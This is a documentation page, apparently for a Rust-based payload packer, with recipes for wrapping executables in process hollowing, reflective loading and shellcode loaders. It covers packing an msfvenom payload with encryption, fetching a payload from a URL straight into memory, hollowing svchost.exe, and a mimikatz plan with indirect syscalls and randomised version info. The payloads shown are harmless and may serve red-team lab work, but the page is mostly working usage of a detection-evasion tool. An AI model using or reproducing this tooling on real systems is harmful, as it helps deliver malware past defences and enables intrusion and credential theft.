# Examples

Small, runnable plans live in `examples/plans/`. Run any of them from the
repository root:

```bash
cargo run -- build examples/plans/<name>.yaml
```

| Plan | What it demonstrates |
| --- | --- |
| `process-hollowing.yaml` | The default Execution technique: run the payload inside a suspended `svchost.exe`. |
| `reflective-loading.yaml` | Manual mapping into the packed binary's own process. |
| `shellcode.yaml` | A raw shellcode payload (`format: shellcode`); the blob is `mov eax, 42; ret`. |
| `args.yaml` | `build.payload.args` and `args_mode` — YAML args plus the packed binary's own. |
| `custom-stub.yaml` | `build.stub.path`: replace the builtin stub with your own Rust template. |
| `mimikatz.yaml` | A full-featured plan: remote payload URL, indirect syscalls, randomised VERSIONINFO and a lab signature. |

## Recipe: pack an msfvenom payload

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o payload.exe
```

```yaml
schema: 4
name: demo

build:
  payload:
    source: ./payload.exe
    format: pe
    crypto:
      algo: xchacha20poly1305
      key: random
  output:
    path: ./dist/demo.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:
  - technique: reflective_loading
```

```bash
cargo run -- build payload.yaml
```

The full walk-through is [Getting started](../getting-started.md).

## Recipe: pack a payload from a URL

`build.payload.source` accepts `http(s)://`; the input is fetched **in memory**
and never written to disk. Pin it with `sha256` (64 hex characters) so a changed
URL cannot silently change what gets packed:

```yaml
build:
  payload:
    source: "https://example.invalid/payload.exe"
    # sha256: "<the expected 64-hex digest>"
```

## Recipe: one plan, several targets

Positional args after the plan path are substituted as `$arg.0$`, `$arg.1$`,
…:

```bash
picaro build plan.yaml "C:\\Windows\\System32\\svchost.exe"
```

```yaml
runtime:
  - technique: process_hollowing
    params:
      target: "$arg.0$"
```

## End-to-end tests

--8<-- "examples/README.md"
